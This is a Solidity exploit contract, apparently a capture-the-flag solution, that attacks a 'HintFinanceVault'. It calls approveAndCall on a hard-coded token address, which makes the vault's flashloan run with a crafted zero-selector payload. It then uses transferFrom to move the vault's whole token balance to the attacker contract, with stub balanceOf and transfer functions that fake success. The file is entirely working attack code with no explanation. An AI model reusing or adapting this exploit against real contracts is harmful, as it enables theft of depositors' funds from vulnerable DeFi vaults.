// SPDX-License-Identifier:MIT

pragma solidity 0.8.16;

import "./HintFinanceVault.sol";

contract FlashloanExploit {
    uint256 public myBalance;

    function exploit(address vaultAddress) external {
        bytes memory innerPayload = abi.encodeWithSelector(
            bytes4(0x00000000),
            vaultAddress,
            bytes32(0),
            bytes32(0),
            bytes32(0)
        );
        bytes memory hintVaultPayload = abi.encodeWithSignature(
            "flashloan(address,uint256,bytes)",
            address(this),
            0xa0,
            innerPayload
        );

        bytes memory SANDPayload = abi.encodeWithSignature(
            "approveAndCall(address,uint256,bytes)",
            vaultAddress,
            1,
            hintVaultPayload
        );

        (bool success, ) = address(0x3845badAde8e6dFF049820680d1F14bD3903a5d0)
            .call(SANDPayload);
        require(success, "SAND call failed");

        ERC20Like(0x3845badAde8e6dFF049820680d1F14bD3903a5d0).transferFrom(
            vaultAddress,
            address(this),
            ERC20Like(0x3845badAde8e6dFF049820680d1F14bD3903a5d0).balanceOf(
                vaultAddress
            )
        );
    }

    function balanceOf(address caller) external returns (uint256) {
        return 1;
    }

    function transfer(address caller, uint256 amount) external returns (bool) {
        return true;
    }

    fallback() external payable {}

    receive() external payable {}
}
